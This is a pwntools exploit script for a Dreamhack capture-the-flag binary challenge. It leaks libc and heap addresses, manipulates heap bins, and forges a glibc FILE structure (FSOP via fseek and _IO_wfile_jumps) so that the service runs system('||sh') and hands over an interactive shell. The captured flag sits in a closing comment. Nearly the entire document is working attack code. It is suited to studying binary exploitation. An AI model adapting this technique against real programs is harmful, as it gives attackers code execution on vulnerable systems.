#!/usr/bin/env python3

from pwn import *

exe = ELF('./prob_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def f_open(x):
	sla(b"> ", b"1")
	sla(b"size: ", f"{6}".encode())
	sa(b"name: ", f"/tmp/{x}".encode())

def f_read():
	sla(b"> ", b"2")

def check(): # check if program is still alive
	global p
	s = p.recvline()
	if(s != b"1) open\n"):
		raise Exception

def f_write(data):
	sla(b"> ", b"3")
	sla(b"input: ", data)
	check()

def f_close():
	sla(b"> ", b"4")
	check()

script = '''
b *fseek
'''

#p = gdb.debug('./prob_patched', gdbscript = script)

#for i in range(1):
while(True):
	try:
		p = remote("host8.dreamhack.games", 12736)
		#p = process('./prob_patched')

		f_open(0)
		# leak libc
		f_write(b"B" * 0x3d0)
		f_write(b"A" * 6)
		f_read()
		rcu(b"A" * 6 + b"\n" + b"\x00")
		libc_base = u64(p.recv(8)) - 0x21a1b0
		heap_base = u64(p.recv(8)) - 0x470
		lleak("libc_base", libc_base)
		lleak("heap_base", heap_base)

		# move fp chunk to unsortedbin
		for i in range(8):
			f_write(b"A" * 0x100) # 0x100 is important
			f_close()
		## so the fp (unsortedbin) chunk wont be corrupt
		## also forge the next getline() will take from unsortedbin chunk (not tcache)
	
		break
	except:
		try:
			p.close()
		except:
			pass

#debug()

# FSOP via fseek
## https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fseek.c#L31
## https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/ioseekoff.c#L32
fileptr = heap_base + 0x2a0
system = libc_base + libc.symbols['system']
fp = FileStructure(0)
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = fileptr + 0x50
fp._wide_data = fileptr - 0x10
fp.unknown2 =  p64(0) * 3 + p64(0) + p64(0) + p64(fileptr + 0x10 - 0x68) # padding the mode = 0
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x30
payload = bytes(fp)

sla(b"> ", b"3")
sla(b"input: ", payload)

p.interactive()
#DH{d1db1bb39cbf769c964c7ba063fde122}